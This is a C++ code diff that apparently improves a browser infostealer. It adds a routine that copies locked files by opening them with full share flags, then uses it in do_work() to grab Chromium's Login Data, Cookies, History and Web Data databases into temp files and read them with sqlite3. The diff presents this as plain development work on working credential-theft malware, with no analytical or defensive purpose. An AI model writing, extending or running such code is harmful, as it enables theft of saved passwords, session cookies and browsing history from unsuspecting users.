@@ -223,9 +223,30 @@ std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
         char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
         char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
         char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
-        for (j = 0; j < i - 1; j++) ret.push_back(char_array_3[j]);
+        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
     }
     return ret;
+}
+
+bool copy_file_locked(const fs::path& source, const fs::path& dest) {
+    HANDLE h_src = CreateFileW(source.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, 0, nullptr);
+    if (h_src == INVALID_HANDLE_VALUE) return false;
+
+    HANDLE h_dest = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
+    if (h_dest == INVALID_HANDLE_VALUE) {
+        CloseHandle(h_src);
+        return false;
+    }
+
+    char buffer[65536];
+    DWORD bytes_read, bytes_written;
+    while (ReadFile(h_src, buffer, sizeof(buffer), &bytes_read, nullptr) && bytes_read > 0) {
+        WriteFile(h_dest, buffer, bytes_read, &bytes_written, nullptr);
+    }
+
+    CloseHandle(h_src);
+    CloseHandle(h_dest);
+    return true;
 }
 
 Browser get_browser() {
@@ -312,7 +333,7 @@ void do_work() {
         fs::path db_path = p_path / "Login Data";
         fs::path tmp_db = temp_dir / "pass.tmp";
         if (fs::exists(db_path)) {
-            fs::copy_file(db_path, tmp_db, fs::copy_options::overwrite_existing);
+            copy_file_locked(db_path, tmp_db);
             sqlite3* db;
             if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
                 sqlite3_stmt* stmt;
@@ -347,7 +368,7 @@ void do_work() {
         db_path = p_path / "Network/Cookies";
         tmp_db = temp_dir / "cook.tmp";
         if (fs::exists(db_path)) {
-            fs::copy_file(db_path, tmp_db, fs::copy_options::overwrite_existing);
+            copy_file_locked(db_path, tmp_db);
             sqlite3* db;
             if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
                 sqlite3_stmt* stmt;
@@ -389,7 +410,7 @@ void do_work() {
         db_path = p_path / "History";
         tmp_db = temp_dir / "hist.tmp";
         if (fs::exists(db_path)) {
-            fs::copy_file(db_path, tmp_db, fs::copy_options::overwrite_existing);
+            copy_file_locked(db_path, tmp_db);
             sqlite3* db;
             if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
                 sqlite3_stmt* stmt;
@@ -410,7 +431,7 @@ void do_work() {
         db_path = p_path / "Web Data";
         tmp_db = temp_dir / "web.tmp";
         if (fs::exists(db_path)) {
-            fs::copy_file(db_path, tmp_db, fs::copy_options::overwrite_existing);
+            copy_file_locked(db_path, tmp_db);
             sqlite3* db;
             if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
                 sqlite3_stmt* stmt;
